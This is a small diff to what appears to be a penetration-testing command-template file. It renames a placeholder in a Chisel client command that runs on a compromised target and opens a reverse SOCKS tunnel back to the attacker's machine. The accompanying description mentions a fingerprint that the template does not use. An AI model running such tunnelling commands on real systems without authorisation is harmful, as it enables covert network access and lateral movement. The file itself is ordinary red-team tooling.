@@ -9,7 +9,7 @@
     },
     {
       "title": "Run Chisel Client on Target",
-      "template": "./chisel.exe client  {attacker_ip}:6666 R:1080:socks",
+      "template": "./chisel.exe client  {local_ip}:6666 R:1080:socks",
       "description": "Connect the Chisel client from the target to the attacker. Replace {fingerprint} with server fingerprint and {attacker_ip} with your attack machine IP."
     },
     {
